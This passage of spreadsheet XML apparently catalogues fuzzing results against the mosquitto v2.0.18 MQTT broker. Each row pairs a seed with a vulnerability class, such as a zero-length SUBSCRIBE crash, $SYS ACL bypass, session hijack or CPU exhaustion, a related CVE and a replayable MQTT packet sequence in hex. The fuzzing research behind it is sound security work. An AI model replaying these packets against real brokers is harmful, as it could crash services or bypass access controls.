          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C77" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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7" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 694B (报告+请求数据)\u000a请求数据: 123B\u000a\u000a---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MQTT请求序列(123B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=80640002000000000000000000000000\u000aMsg[2]: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</f>
        <v/>
      </c>
      <c r="F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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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8">
      <c r="A78" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B78" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C78" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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78" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c2 ===\u000a大小: 813B (报告+请求数据)\u000a请求数据: 96B\u000a\u000a---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MQTT请求序列(96B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=564 Topics=[''(零长度!QoS=1)] | raw_header=820702340000012300\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload='\x025\x1c\x02\uÅP#Qb\x08\x00\x01t\u0009\x00\x08ìÿ%\x8bó\x98Î\x84\x0bÔ\x8að\x0fî\x9f¸\x82þ\x95\x8b®' | raw_header=3346001d245359532f62726f6b65722f\u000aMsg[3]: CONNACK  | raw_header=2000\u000aMsg[4]: (不完整,13B) raw=ffd0c83ff010000009d0c81f8c\u000a(尾部13B): ffd0c83ff010000009d0c81f8c</f>
        <v/>
      </c>
      <c r="F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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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9">
      <c r="A79" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B79" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C79" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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9" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0244 ===\u000a大小: 614B (报告+请求数据)\u000a请求数据: 67B\u000a\u000a---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DISCONNECT 断开连接 | raw_header=e000\u000aMsg[2]: TYPE0  | raw_header=001173656e736f72003c000766757a7a\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=1)] | raw_header=820b0001000011736554540402\u000aMsg[4]: (不完整,33B) raw=003c000766757a7a5f63343116000d746573742f72657461696e65646b6500e000\u000a(尾部33B): 003c000766757a7a5f63343116000d746573742f72657461696e65646b6500e000</f>
        <v/>
      </c>
      <c r="F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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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80">
      <c r="A80" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B80" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C80" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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80" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 1411B (报告+请求数据)\u000a请求数据: 170B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(170B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=83 Topics=[] | raw_header=82170053050b8ea8c702000026000000\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=120B | raw_header=388d010013245359532f62726f6b6572\u000aMsg[3]: CONNECT  | raw_header=19</f>
        <v/>
      </c>
      <c r="F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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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8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1">
      <c r="A81" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B81" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C81" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(207B)\u000a4.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81" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 1635B (报告+请求数据)\u000a请求数据: 207B\u000a\u000a---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MQTT请求序列(207B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=10 Topics=[] | raw_header=8241000a050ba2b3e17a001424736861\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=86B | raw_header=336b0013245359532f62726f6b65722f\u000aMsg[3]: CONNECT  | raw_header=1000\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: (不完整,27B) raw=5a337fff5f626f756e646172795f746573745f707572706f736553\u000a(尾部27B): 5a337fff5f626f756e646172795f746573745f707572706f736553</f>
        <v/>
      </c>
      <c r="F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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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2">
      <c r="A82" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B82" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C82" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(216B)\u000a4.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82" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 693B (报告+请求数据)\u000a请求数据: 216B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(216B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a22504480000152473686172652f6772\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1324532f62726f6b65722f7672727369\u000aMsg[6]: PUBREL PacketID=9 | raw_header=65020009\u000aMsg[7]: PUBREL PacketID=22575 | raw_header=612f582f632f642f6501341d00142473\u000aMsg[8]: (不完整,4B) raw=71736f72\u000a(尾部4B): 71736f72</f>
        <v/>
      </c>
      <c r="F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8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82" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J8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82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3">
      <c r="A83" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B83" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C83" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(252B)\u000a4.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83" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 734B (报告+请求数据)\u000a请求数据: 252B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(252B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10130000000100000000010036823902\u000aMsg[2]: (不完整,231B) raw=02814132004b000a2453592f7604657374143c0132114008746533742f666f6f2f7a785f47368239\u000a(尾部231B): 02814132004b000a2453592f7604657374143c0132114008746533742f666f6f2f7a785f4736823902515f533d32004b000a</f>
        <v/>
      </c>
      <c r="F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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J8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8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84">
      <c r="A84" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B84" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C84" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D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84" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0102 ===\u000a大小: 546B (报告+请求数据)\u000a请求数据: 50B\u000a\u000a---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MQTT请求序列(50B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=102s Will=YES WillTopic='$SYS/broker/version' [自动清理会话] | raw_header=102f00044d5154540436006600000013\u000aMsg[2]: PINGRESP  | raw_header=d3</f>
        <v/>
      </c>
      <c r="F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8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84" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J8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5">
      <c r="A85" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B85" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C85" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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85" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0181 ===\u000a大小: 1478B (报告+请求数据)\u000a请求数据: 814B\u000a\u000a---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MQTT请求序列(814B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10650000000000000000000000800000\u000aMsg[2]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31ff01ee946775d349beb38b6dfaed9b\u000aMsg[3]: PUBCOMP PacketID=12075 | raw_header=7f652f2b2f74656d7065726134757265\u000aMsg[4]: PUBLISH Topic='$share/grp\x001$share/gr' QoS=0 retain=False payload_len=59B | raw_header=385200152473686172652f6772700031\u000aMsg[5]: TYPE0  | raw_header=05020036\u000aMsg[6]: TYPE0  | raw_header=0b110f1c81f322737b15245359532f62\u000aMsg[7]: PUBREL PacketID=12150 | raw_header=65722f76656073696f6e9067f87ae98e\u000aMsg[8]: (不完整,127B) raw=207fff6c9572652f67332f686f7f652f2b2f74656d7065726134757265021f012f74656d70000b53\u000a(尾部127B): 207fff6c9572652f67332f686f7f652f2b2f74656d7065726134757265021f012f74656d70000b535a532f62726f6b65722f</f>
        <v/>
      </c>
      <c r="F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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J8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8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86">
      <c r="A86" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B86" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C86" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D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86" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 600B (报告+请求数据)\u000a请求数据: 93B\u000a\u000a---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MQTT请求序列(93B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v130 ClientID=''(4900B) clean_session=True keepalive=27s Will=YES [自动清理会话] | raw_header=101300044d5154548246001b00132453\u000aMsg[2]: (不完整,72B) raw=6f6b65722f76657273696f6e00002b766572792f646565702f746f7069632f6c6576656c312f6c65\u000a(尾部72B): 6f6b65722f76657273696f6e00002b766572792f646565702f746f7069632f6c6576656c312f6c6576656c322f6c6576656c</f>
        <v/>
      </c>
      <c r="F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8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86" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J8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8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7">
      <c r="A87" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B87" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C87" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(232B)\u000a4.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87" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 1201B (报告+请求数据)\u000a请求数据: 232B\u000a\u000a---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MQTT请求序列(232B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='hom`\x1a+/telí\x84m½ÕW\x86\x17' QoS=2 retain=True payload='Ë\x18$\x11É\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11+/+/+\x015\x05\x00\x01#\x00\x18' | raw_header=35370012686f6d601a2b2f74656ced84\u000aMsg[2]: PUBLISH Topic='test/#' QoS=0 retain=False payload_len=104B | raw_header=30700006746573742f23414141414141\u000aMsg[3]: PUBLISH Topic='test/topic' QoS=1 retain=True payload='\x00\x1ahello' | raw_header=3313000a746573742f746f706963001a\u000aMsg[4]: PUBLISH Topic='$SYS/broker/uptime' QoS=2 retain=False payload='\x00\x1b{"temp":22.5}' | raw_header=34230012245359532f62726f6b65722f\u000aMsg[5]: PINGREQ  | raw_header=c600\u000aMsg[6]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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8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88">
      <c r="A88" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B88" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C88" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(143B)\u000a4.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88" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:02c4 ===\u000a大小: 990B (报告+请求数据)\u000a请求数据: 143B\u000a\u000a---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MQTT请求序列(143B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2559 Topics=[] | raw_header=822d09ffff6226262626262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: TYPE0  | raw_header=001c2473686172652f67332f686f6d65\u000aMsg[4]: (不完整,26B) raw=ec5b076279f3b620be0d8c95cdd54cc11f03c75b34b1387efc79\u000a(尾部26B): ec5b076279f3b620be0d8c95cdd54cc11f03c75b34b1387efc79</f>
        <v/>
      </c>
      <c r="F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8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88" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J8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88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9">
      <c r="A89" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B89" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C89" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(219B)\u000a4.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89" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0305 ===\u000a大小: 1038B (报告+请求数据)\u000a请求数据: 219B\u000a\u000a---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MQTT请求序列(219B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v0 ClientID=''(0B) clean_session=False keepalive=250s [持久会话] | raw_header=101300044d515454000000fa0000fa00\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['sensor/+\x82;\x00\x1e"'(QoS=3)] | raw_header=82120001000d73656e736f722f2b823b\u000aMsg[3]: (不完整,178B) raw=88c1be7926000d2473686172652f677270312f23000b73656e736f722f74656d700013245359532f\u000a(尾部178B): 88c1be7926000d2473686172652f677270312f23000b73656e736f722f74656d700013245359532f62726f6b65722f766572</f>
        <v/>
      </c>
      <c r="F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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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8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90">
      <c r="A90" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B90" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C90" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(1502B)\u000a4.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0x0385\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E90" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0385 ===\u000a大小: 3673B (报告+请求数据)\u000a请求数据: 1502B\u000a\u000a---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MQTT请求序列(1502B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=32512s [持久会话] | raw_header=1020000000007f000000100766757a7a\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3232323232323232322c400e80640000\u000aMsg[3]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37323232323232323232323232323232\u000aMsg[4]: PUBREL PacketID=12850 | raw_header=62323232323232323232323232323232\u000aMsg[5]: UNSUBSCRIBE  | raw_header=a2323232323232323232323232323232\u000aMsg[6]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[7]: PINGREQ  | raw_header=c000\u000aMsg[8]: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raw_header=32323232323232323232323232323232\u000aMsg[19]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[20]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[21]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[22]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232000032323232323232323232\u000aMsg[23]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[24]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[25]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000a(尾部270B): 3232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232</f>
        <v/>
      </c>
      <c r="F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90" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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9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91">
      <c r="A91" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B91" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C91" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(94B)\u000a4.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91" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 577B (报告+请求数据)\u000a请求数据: 94B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(94B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='fuzz_c6'(7B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=39 Topics=[''(零长度!QoS=2)] | raw_header=821e002700000a746573742f746f7069\u000aMsg[3]: (不完整,41B) raw=737562c000a20a00020006746573742f2330130006746573742f7861667465725f756e737d62c000\u000a(尾部41B): 737562c000a20a00020006746573742f2330130006746573742f7861667465725f756e737d62c00000</f>
        <v/>
      </c>
      <c r="F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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J9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9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2">
      <c r="A92" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B92" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C92" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(112B)\u000a4.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92" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 759B (报告+请求数据)\u000a请求数据: 112B\u000a\u000a---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MQTT请求序列(112B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1400 Topics=['$share/g3/home/+/temperature'(QoS=1), '$SYS/broker/clients/connected'(QoS=2), ''(零长度!QoS=1)] | raw_header=82440578001c2473686172652f67332f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\x05yÂçÆ"÷\x08d\x08õûD@tVäO' | raw_header=3a270013245359532f62726f6b65722f\u000aMsg[3]: CONNECT  | raw_header=11</f>
        <v/>
      </c>
      <c r="F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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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9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93">
      <c r="A93" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B93" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C93" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(2214B)\u000a4.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93" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 2886B (报告+请求数据)\u000a请求数据: 2214B\u000a\u000a---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MQTT请求序列(2214B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=102f2f202f48ff0000002f0f332f2f2f\u000aMsg[2]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[3]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[4]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[5]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[6]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[7]: SUBSCRIBE PacketID=389 Topics=[''(零长度!QoS=2)] | raw_header=821801850000122473686172652f6772\u000aMsg[8]: PUBLISH Topic='+/data' QoS=2 retain=True payload_len=99B | raw_header=356b00062b2f64617461018624080006\u000aMsg[9]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[10]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[11]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[12]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[13]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[14]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[15]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[16]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[17]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[18]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[19]: PUBCOMP PacketID=30583 | raw_header=77777777777777777777777777777777\u000aMsg[20]: (不完整,94B) raw=77777777777777777777777777777777770077777777777777777777777777777777777777777777\u000a(尾部94B): 7777777777777777777777777777777777007777777777777777777777777777777777777777777777777777777777777777</f>
        <v/>
      </c>
      <c r="F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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J9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9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4">
      <c r="A94" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B94" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C94" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(207B)\u000a4.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94" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 921B (报告+请求数据)\u000a请求数据: 207B\u000a\u000a---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MQTT请求序列(207B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=74 Topics=[''(零长度!QoS=0)] | raw_header=8226004a0000002c001d245359532f62\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=142B | raw_header=3ba3010013245359532f62726f6b6572\u000aMsg[3]: SUBACK  | raw_header=94</f>
        <v/>
      </c>
      <c r="F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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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9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95">
      <c r="A95" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B95" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C95" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(882B)\u000a4.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95" s="2">
